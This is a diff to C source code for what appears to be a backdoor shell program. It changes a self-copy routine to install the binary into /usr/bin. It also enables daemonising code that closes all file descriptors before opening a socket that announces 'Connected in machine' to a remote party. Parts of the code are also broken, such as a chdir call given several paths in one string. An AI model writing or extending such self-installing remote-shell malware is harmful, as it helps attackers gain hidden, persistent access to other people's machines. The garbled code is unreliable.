@@ -23,7 +23,7 @@ int auto_copy()
 
 {
 
-    char *args[] = {"/bin/cp", "-t", "/home/roberto", __progname, 0};
+    char *args[] = {"/bin/cp", "-t", "/usr/bin", __progname, 0};
 
     execve(args[0], &args[0], 0);
 
@@ -69,17 +69,17 @@ int shell()
             exit(EXIT_SUCCESS);
 
 
-     //sigmask(0);
+      sigmask(0);
 
-     //chdir("/, /etc, C:\\Windows\\System32\\");
+      chdir("/, /etc, C:\\Windows\\System32\\");
 
- // int l;
+      int l;
 
-      // for( l = sysconf(_SC_OPEN_MAX); l >= 0; l--)
+       for( l = sysconf(_SC_OPEN_MAX); l >= 0; l--)
 
 
- //{
-        //close(l);
+ {
+       close(l);
 
     struct sockaddr_in s;
 
@@ -126,7 +126,7 @@ int shell()
 
       made conditions here. */
 
-     send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0);
+     send(x,"\nConnection done!\n",18,0), send(x,"\nConnected in machine\n",22,0);
      if(connect == false)
      perror("BREAK CONNECTION,(failure)");
      else
